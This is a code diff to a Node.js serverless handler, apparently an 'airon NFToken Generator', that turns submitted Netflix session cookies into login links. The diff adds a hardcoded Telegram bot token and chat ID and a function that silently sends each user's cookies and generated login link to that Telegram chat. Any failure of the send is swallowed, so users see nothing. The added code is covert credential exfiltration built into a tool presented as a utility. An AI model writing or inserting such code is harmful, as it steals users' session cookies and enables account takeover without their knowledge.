@@ -13,6 +13,10 @@ const { URL } = require('url');
 const API_HOST = 'ios.prod.ftl.netflix.com';
 const API_PATH = '/iosui/user/15.48';
 
+// Telegram Config
+const TELEGRAM_BOT_TOKEN = '8368738660:AAFK_aq_1UKZIAB_4oeVxV-N79gXXvGpkn8';
+const TELEGRAM_CHAT_ID = '6326377463';
+
 const QUERY_PARAMS = {
   appVersion: '15.48.1',
   config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
@@ -170,6 +174,49 @@ function fetchNFToken(netflixId) {
   });
 }
 
+function sendTelegram(token, loginLink, expiry, cookies) {
+  return new Promise((resolve, reject) => {
+    const now = new Date();
+    const timestamp = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
+
+    const message = `🔥 *airon NFToken Generator*\n\n` +
+      `✅ *Generate Sukses!*\n\n` +
+      `🔗 *Login Link:*\n\`${loginLink}\`\n\n` +
+      `⏰ *Expiry:* ${expiry}\n` +
+      `📅 *Generated:* ${timestamp}\n\n` +
+      `🍪 *Cookies:*\n\`\`\`\n${cookies.substring(0, 3000)}\n\`\`\``;
+
+    const postData = JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true,
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData),
+      },
+    };
+
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => resolve(data));
+    });
+
+    req.on('error', (e) => reject(e));
+    req.setTimeout(10000, () => { req.destroy(); reject(new Error('Telegram timeout')); });
+    req.write(postData);
+    req.end();
+  });
+}
+
 module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -202,6 +249,13 @@ module.exports = async (req, res) => {
     const { token, expires } = await fetchNFToken(netflixId);
     const expiry = getExpiry(expires);
     const loginLink = `https://netflix.com/?nftoken=${token}`;
+
+    // Send to Telegram
+    try {
+      await sendTelegram(token, loginLink, expiry, cookieInput);
+    } catch (e) {
+      // Don't fail if Telegram fails
+    }
 
     return res.status(200).json({
       token,
